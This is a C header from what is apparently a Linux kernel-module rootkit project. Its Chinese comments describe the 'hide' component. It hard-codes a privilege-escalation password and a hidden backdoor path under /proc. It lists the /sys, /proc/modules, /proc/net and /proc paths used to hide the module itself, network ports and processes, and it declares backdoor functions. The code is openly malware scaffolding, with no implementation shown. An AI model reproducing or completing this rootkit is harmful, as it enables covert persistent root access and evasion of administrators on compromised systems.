#ifndef HIDE_H
#define HIDE_H

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/sched.h>
#include <linux/notifier.h>
#include <linux/types.h>
#include <linux/fs.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <net/sock.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Eidos");
MODULE_DESCRIPTION("LKM Rootkit - Hide Part");
/**
 * 部分宏定义以方便函数撰写。 
 */

// 提权所需口令
#define PASSWORD "ELPSYKONGROO"
#define BACKDOOR "STEINSGATE" // 后门需要利用文件隐藏藏好
#define BACKDOOR_PATH "/proc/STEINSGATE" // 因此需要特地先藏好这个文件路径

// 模块隐藏所需参数
#define MODULE_NAME "hide" // 模块名称记为hide（可修改）
#define ROOT_PATH "/sys/module" // 使用文件隐藏方式隐藏模块的路径
#define PROC_PATH "/proc/modules" // 使用进程模块隐藏方式隐藏路径

// 端口隐藏所需参数
#define TCP4_NET_ENTRY "/proc/net/tcp"
#define TCP6_NET_ENTRY "/proc/net/tcp6"
#define UDP4_NET_ENTRY "/proc/net/udp"
#define UDP6_NET_ENTRY "/proc/net/udp6"

// 进程隐藏所需参数
#define PATH "/proc"

// 后门添加
void backdoor(void);
void cleanbackdoor(void);

#endif